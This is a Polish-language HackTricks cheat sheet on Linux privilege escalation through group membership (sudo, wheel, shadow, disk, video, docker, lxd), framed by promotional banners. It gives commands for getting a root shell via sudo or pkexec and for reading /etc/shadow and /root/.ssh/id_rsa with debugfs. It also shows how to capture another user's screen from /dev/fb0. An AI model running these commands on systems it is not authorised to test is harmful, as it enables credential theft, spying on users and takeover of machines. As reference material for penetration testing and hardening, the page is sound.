<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>


# Grupy Sudo/Admin

## **PE - Metoda 1**

**Czasami**, **domyślnie \(lub dlatego, że niektóre oprogramowanie tego wymaga\)** w pliku **/etc/sudoers** można znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy sudo lub admin może wykonywać polecenia jako sudo**.

Jeśli tak jest, aby **stać się użytkownikiem root, wystarczy wykonać**:
```text
sudo su
```
## PE - Metoda 2

Znajdź wszystkie binarne pliki suid i sprawdź, czy istnieje plik binarny **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli zauważysz, że binarny plik pkexec ma ustawiony bit SUID i należysz do grupy sudo lub admin, prawdopodobnie będziesz mógł wykonywać binarne pliki jako sudo za pomocą pkexec.
Sprawdź zawartość:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Poniżej znajdziesz informacje o grupach, które mają uprawnienia do wykonania **pkexec** i które **domyślnie** mogą występować w niektórych dystrybucjach Linuxa, takich jak **sudo** lub **admin**.

Aby **stać się użytkownikiem root**, można wykonać:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli próbujesz uruchomić **pkexec** i otrzymujesz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. Istnieje jednak sposób na obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji SSH**:

{% code title="sesja1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="sesja2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Grupa Wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć tę linię:
```text
%wheel	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy wheel może wykonywać dowolne polecenie jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```text
sudo su
```
# Grupa Shadow

Użytkownicy z grupy **shadow** mogą **odczytywać** plik **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Tak więc, przeczytaj plik i spróbuj **odkodować niektóre hashe**.

# Grupa dyskowa

Ten przywilej jest prawie **równoważny dostępowi root** ponieważ umożliwia dostęp do wszystkich danych wewnątrz maszyny.

Pliki: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs możesz również **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz wykonać:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednakże, jeśli spróbujesz **zapisać pliki należące do roota** \(takie jak `/etc/shadow` lub `/etc/passwd`\), otrzymasz błąd "**Permission denied**".

# Grupa Video

Za pomocą polecenia `w` można sprawdzić **kto jest zalogowany w systemie** i wyświetlić wynik podobny do poniższego:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do wyświetlania obrazu z ekranu. W zasadzie można obserwować ekran. Aby to zrobić, musisz **przechwycić bieżący obraz na ekranie** w postaci surowych danych i uzyskać rozdzielczość, jaką ekran używa. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **surowy obraz**, można użyć **GIMP**, wybrać plik **`screen.raw`** i wybrać jako typ pliku **Dane surowego obrazu**:

![](../../.gitbook/assets/image%20%28208%29.png)

Następnie zmodyfikuj szerokość i wysokość na te używane na ekranie i sprawdź różne typy obrazu \(i wybierz ten, który najlepiej pokazuje ekran\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Grupa Root

Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usług** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być wykorzystane do eskalacji uprawnień...

**Sprawdź, które pliki mogą być modyfikowane przez członków grupy root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Grupa Docker

Możesz zamontować system plików roota hosta na woluminie instancji, więc gdy instancja zostanie uruchomiona, natychmiast wczytuje `chroot` do tego woluminu. To efektywnie daje ci uprawnienia roota na maszynie.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Grupa lxc/lxd

[lxc - Eskalacja uprawnień](lxd-privilege-escalation.md)



<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
